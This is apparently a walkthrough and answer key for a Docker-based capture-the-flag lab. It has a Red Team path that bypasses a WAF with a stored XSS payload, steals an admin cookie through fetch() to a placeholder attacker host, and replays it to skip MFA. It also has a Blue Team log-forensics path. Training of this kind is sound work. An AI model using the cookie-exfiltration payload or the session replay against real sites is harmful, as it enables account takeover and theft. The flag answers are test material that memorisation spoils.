# How to get the flags — step by step

All 34 flags follow the format `SCENARIO75{answer}`: **16 for the Red Team path**
and **18 for the Blue Team path**. Two of them (#16 and #34) are the "final"
victory flags — if you have those two, you've completed the lab.

Everything below was run against a live deployment. `<IP>` is the address of the
machine hosting the lab (use `127.0.0.1` if you're on that machine).

> Not deployed yet? Start with [`../GETTING-STARTED.md`](../GETTING-STARTED.md).

---

## Step 0 — reset the state before you start

Two things make a demo repeatable:

```bash
cd naulidata-cyberrange

# the telemetry log keeps growing while the lab runs — re-seed it so the
# attacker footprint is the only interesting thing in the file
sudo docker compose -f docker/docker-compose.yml exec -T app \
  python3 /usr/src/app/scripts/inject_logs.py --dir /opt/admin/logs --clear
```

**Important:** the accepted admin session tokens live in the app's memory. If you
rebuild or restart the lab (`up -d --build`, `restart`, reboot), tokens you
captured earlier stop working — capture a fresh one (Step 4). The admin bot
re-authenticates on its own, so a new token appears within ~30 seconds.

---

# Part A — Red Team path (flags 1–16)

## Step 1 — Reconnaissance → flags 1, 2, 3, 4, 5, 6, 11

```bash
# 1) the response tells you the backend + hands out the pre-auth cookie
curl -si http://<IP>:3075/ | grep -iE 'x-powered-by|set-cookie'
```
```
X-Powered-By: Node.js (Express)                                      -> flag 1  SCENARIO75{Node.js}
Set-Cookie: pre_mfa_session=pending_mfa_verification; Path=/; SameSite=Lax
```

Notice the `Set-Cookie` has **no `HttpOnly`** attribute — JavaScript can read it:
```
-> flag 5  SCENARIO75{pre_mfa_session}
-> flag 6  SCENARIO75{pending_mfa_verification}
-> flag 11 SCENARIO75{False}          (HttpOnly = False)
```
The home page also states it in plain sight, and a source comment lists all three:
```bash
curl -s http://<IP>:3075/ | grep -o '<!--.*SCENARIO75.*-->'
# <!-- SCENARIO75{Node.js} — backend technology is exposed via the X-Powered-By header -->
# <!-- SCENARIO75{pre_mfa_session} / SCENARIO75{pending_mfa_verification} / SCENARIO75{False} -->
```

```bash
# 2) robots.txt — and the ASCII-art comment that points you at it
curl -s http://<IP>:3075/ | grep -i robots
# Psst... have you checked robots.txt lately?  ->  SCENARIO75{robots.txt}   -> flag 4

curl -s http://<IP>:3075/robots.txt
```
```
User-agent: *
Disallow: /api/verify-mfa                                            -> flag 2  SCENARIO75{/api/verify-mfa}
Disallow: /dashboard                                                  -> flag 3  SCENARIO75{/dashboard}
```

## Step 2 — The WAF blocks the obvious payload → flags 7, 8

```bash
# the feedback endpoint is POST-only
curl -s -o /dev/null -w '%{http_code}\n' http://<IP>:3075/api/feedback
# 405                                                                 -> flag 7  SCENARIO75{POST}

# the WAF rejects <script>
curl -s -o /dev/null -w '%{http_code}\n' -X POST http://<IP>:3075/api/feedback \
  --data-urlencode 'message=<script>alert(1)</script>'
# 403                                                                 -> flag 8  SCENARIO75{403}

# it also rejects the raw keywords document and cookie
curl -s -o /dev/null -w '%{http_code}\n' -X POST http://<IP>:3075/api/feedback \
  --data-urlencode 'message=document.cookie'
# 403
```
Read the 403 body for the extra hint comment (`SCENARIO75{403}`).

## Step 3 — Bypass the WAF → flags 9, 10, 12

Combine an HTML5 `<svg onload>` element, bracket-notation cookie access and the
`fetch` API:

```bash
curl -s -o /dev/null -w '%{http_code}\n' -X POST http://<IP>:3075/api/feedback \
  --data-urlencode 'author=pwn' \
  --data-urlencode "message=<svg onload=\"fetch('http://<ATTACKER>:8899/?c='+encodeURIComponent(window['docu'+'ment']['coo'+'kie']))\">"
# 200                                     <- accepted and stored
```
```
-> flag 9  SCENARIO75{<svg>}                                  (the HTML5 element)
-> flag 10 SCENARIO75{window['docu'+'ment']['coo'+'kie']}      (bracket notation)
-> flag 12 SCENARIO75{fetch}                                   (exfiltration API)
```
`<ATTACKER>` must be reachable **from the bot container**. On the same host, use
`host.docker.internal`.

## Step 4 — Steal the admin cookie → flag 14

Start the listener on the attacker host **before** waiting for the bot:

```bash
python3 exploit/exfil_server.py --port 8899
```
The admin bot signs in (with MFA) and opens `/dashboard` every ~20 s; the stored
payload runs inside its authenticated browser and posts the whole cookie bundle:
```
[+] STOLEN COOKIE: pre_mfa_session=pending_mfa_verification; adm_sess=adm_sess_0d3701a21247809dad74959253796521
                                                                       -> flag 14 SCENARIO75{adm_sess}
```

## Step 5 — Replay the cookie → flags 13, 15, 16

```bash
C='adm_sess=adm_sess_<paste-yours>'

curl -s -o /dev/null -w '%{http_code}\n' -b "$C" http://<IP>:3075/dashboard
# 200                       <- MFA was never solved, the token alone opened the dashboard

curl -s -b "$C" http://<IP>:3075/dashboard | grep -oE 'SCENARIO75\{[^}]+\}|class="xss-payload"' | sort -u
```
```
class="xss-payload"                                    -> flag 15 SCENARIO75{xss-payload}
SCENARIO75{/dashboard}
SCENARIO75{Node.js}
SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}                -> flag 16 FINAL RED FLAG
SCENARIO75{adm_sess}
SCENARIO75{xss-payload}
```
`flag 13 = SCENARIO75{/api/verify-mfa}` — the endpoint that was **skipped**. Prove it:

```bash
grep '10.10.14.50' /opt/admin/logs/access.log | grep '/api/verify-mfa'   # (none)
```

**Getting a `302` instead of `200`?** Your token is stale (the lab was rebuilt or
restarted since you captured it). Wait for the next bot cycle and capture a fresh
one — the bot re-authenticates by itself.

---

# Part B — Blue Team path (flags 17–34)

Log in as the analyst and look at the shared logs:

```bash
ssh analyst@<IP> -p 2275          # password: blue_team_rocks
cd /opt/admin/logs && ls -la
```
```
access.log   error.log                                        -> flag 17 SCENARIO75{/opt/admin/logs}
```

## Step 6 — Log forensics → flags 18, 19, 20, 21, 22

```bash
grep '10.10.14.50' access.log
```
```
10.10.14.50 - - [08/Oct/2026:18:49:30 +0700] "GET /robots.txt HTTP/1.1" 200 118 "-" "Mozilla/5.0 (…)" xff=10.10.14.50
10.10.14.50 - - [08/Oct/2026:18:49:58 +0700] "GET / HTTP/1.1" 200 4831 "-" "Mozilla/5.0 (…)" xff=10.10.14.50
10.10.14.50 - - [08/Oct/2026:18:50:15 +0700] "POST /api/feedback HTTP/1.1" 403 0 "-" "Mozilla/5.0 (…)" xff=10.10.14.50
10.10.14.50 - - [08/Oct/2026:18:50:48 +0700] "POST /api/feedback HTTP/1.1" 200 401 "-" "Mozilla/5.0 (…)" xff=10.10.14.50
10.10.14.50 - - [08/Oct/2026:18:51:55 +0700] "GET /dashboard HTTP/1.1" 200 9120 "-" "Mozilla/5.0 (…)" xff=UEhBTlRPTUdSSUR7…
10.10.14.50 - - [08/Oct/2026:18:52:40 +0700] "GET /dashboard HTTP/1.1" 200 9160 "-" "Mozilla/5.0 (…)" xff=UEhBTlRPTUdSSUR7…
```
```
-> flag 18 SCENARIO75{10.10.14.50}     attacker source IP
-> flag 19 SCENARIO75{Mozilla/5.0}     attacker User-Agent
-> flag 20 SCENARIO75{200}             status of the /dashboard hit
-> flag 21 SCENARIO75{18:51:55}        timestamp of that 200
```

The `X-Forwarded-For` on that request carries a Base64 blob:
```bash
grep -oE 'xff=[A-Za-z0-9+/=]{20,}' access.log | sort -u
# xff=UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0
-> flag 22 SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}
```

## Step 7 — Threat hunting → flags 23, 24, 25, 26, 27, 28

```bash
# baseline: legitimate admin traffic comes from a different network
grep -c '192.168.1.100' access.log
# 5                                                    -> flag 23 SCENARIO75{192.168.1.100}

# the attacker IP sits in 10.10.14.0/24
python3 -c "import ipaddress; print(ipaddress.ip_network('10.10.14.50/24', strict=False))"
# 10.10.14.0/24                                        -> flag 24 SCENARIO75{10.10.14.0/24}

# which file records the WAF alerts?
ls -la error.log                                       -> flag 25 SCENARIO75{/opt/admin/logs/error.log}

grep -i WAF error.log
# 2026-10-08T18:50:15+07:00 [WARN] WAF blocked payload containing forbidden token "<script>" from 10.10.14.50
#   -> flag 26 SCENARIO75{<script>}      the first blocked tag
#   -> flag 27 SCENARIO75{18:50:15}      when it was blocked

# did the attacker ever reach the MFA endpoint?
grep '10.10.14.50' access.log | grep '/api/verify-mfa'
# (none)                                              -> flag 28 SCENARIO75{No}
```

## Step 8 — Incident response → flags 29, 30, 31, 32, 33, 34

```bash
echo 'UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=' | base64 -d
# PHANTOMGRID{BLUE_L0g_Hunt3r_M4st3r}
```
```
-> flag 29 SCENARIO75{Base64}      the encoding scheme
-> flag 30 SCENARIO75{44}          length stated in the brief
```
> The literal string in the brief is 47 characters but decodes to a
> `PHANTOMGRID{…}` value; the brief's own answer is **44 / SCENARIO75{…}**. The lab
> stores the string exactly as supplied. See the written explanation §6 for the
> full note.

```bash
grep CRITICAL error.log
```
```
2026-10-08T18:50:15+07:00 [CRITICAL] WAF ALERT: first <script> tag blocked for 10.10.14.50
2026-10-08T18:53:10+07:00 [CRITICAL] Authentication bypass anomaly: admin session cookie reused without MFA. user=admin src=10.10.14.50 path=/dashboard verification=/api/verify-mfa(skipped) X-Forwarded-For=UEhBTlRPTUdSSUR7…
2026-10-08T18:53:10+07:00 [CRITICAL] cookie reuse event flagged CRITICAL (bearer token not bound to client)
```
```
-> flag 31 SCENARIO75{CRITICAL}                        severity for cookie-reuse events
-> flag 32 SCENARIO75{18:53:10}                        timestamp of the anomaly entry
-> flag 33 SCENARIO75{Authentication bypass anomaly}   the exact warning string
-> flag 34 SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}          FINAL BLUE TEAM FLAG
```

---

## Checklist — all 34

### Red Team
| # | Flag | Got it |
|---|------|:------:|
| 1 | `SCENARIO75{Node.js}` | ☐ |
| 2 | `SCENARIO75{/api/verify-mfa}` | ☐ |
| 3 | `SCENARIO75{/dashboard}` | ☐ |
| 4 | `SCENARIO75{robots.txt}` | ☐ |
| 5 | `SCENARIO75{pre_mfa_session}` | ☐ |
| 6 | `SCENARIO75{pending_mfa_verification}` | ☐ |
| 7 | `SCENARIO75{POST}` | ☐ |
| 8 | `SCENARIO75{403}` | ☐ |
| 9 | `SCENARIO75{<svg>}` | ☐ |
| 10 | `SCENARIO75{window['docu'+'ment']['coo'+'kie']}` | ☐ |
| 11 | `SCENARIO75{False}` | ☐ |
| 12 | `SCENARIO75{fetch}` | ☐ |
| 13 | `SCENARIO75{/api/verify-mfa}` | ☐ |
| 14 | `SCENARIO75{adm_sess}` | ☐ |
| 15 | `SCENARIO75{xss-payload}` | ☐ |
| 16 | **`SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}`** | ☐ |

### Blue Team
| # | Flag | Got it |
|---|------|:------:|
| 17 | `SCENARIO75{/opt/admin/logs}` | ☐ |
| 18 | `SCENARIO75{10.10.14.50}` | ☐ |
| 19 | `SCENARIO75{Mozilla/5.0}` | ☐ |
| 20 | `SCENARIO75{200}` | ☐ |
| 21 | `SCENARIO75{18:51:55}` | ☐ |
| 22 | `SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}` | ☐ |
| 23 | `SCENARIO75{192.168.1.100}` | ☐ |
| 24 | `SCENARIO75{10.10.14.0/24}` | ☐ |
| 25 | `SCENARIO75{/opt/admin/logs/error.log}` | ☐ |
| 26 | `SCENARIO75{<script>}` | ☐ |
| 27 | `SCENARIO75{18:50:15}` | ☐ |
| 28 | `SCENARIO75{No}` | ☐ |
| 29 | `SCENARIO75{Base64}` | ☐ |
| 30 | `SCENARIO75{44}` | ☐ |
| 31 | `SCENARIO75{CRITICAL}` | ☐ |
| 32 | `SCENARIO75{18:53:10}` | ☐ |
| 33 | `SCENARIO75{Authentication bypass anomaly}` | ☐ |
| 34 | **`SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`** | ☐ |

Full reference: [`../ANSWER-KEY.md`](../ANSWER-KEY.md).

---

## Troubleshooting

| Symptom | Fix |
|---------|-----|
| Replay returns `302` instead of `200` | the token is stale — the lab was rebuilt/restarted since you captured it. Wait for the next bot cycle (~20 s) and capture a fresh cookie |
| Nothing arrives on the exfil listener | the bot container can't reach the listener: bind it on `0.0.0.0`, use `host.docker.internal` in the payload URL on the same host, and check that the payload was stored (`200`, not `403`) |
| The stored payload never fires | the feedback queue is empty or the bot is logged out; check `docker logs cyberrange-bot` for `[bot] signed in` |
| Blue Team greps return too many lines | re-seed the log (§ Step 0) — the bot writes to `access.log` every ~20 s |
| `grep -o 'xff=…'` also prints plain IPs (`xff=10`, `xff=192`) | those are normal requests carrying a plain IP in XFF; add a minimum length so only the Base64 stands out: `grep -oE 'xff=[A-Za-z0-9+/=]{20,}'` |
| `verify.sh` fails on the Blue Team checks | the telemetry was never seeded — run the `inject_logs.py --clear` command from Step 0 |

`bash scripts/verify.sh` automates 20 of these checks (infrastructure + Red + Blue)
if you want a quick "is the lab healthy" answer.
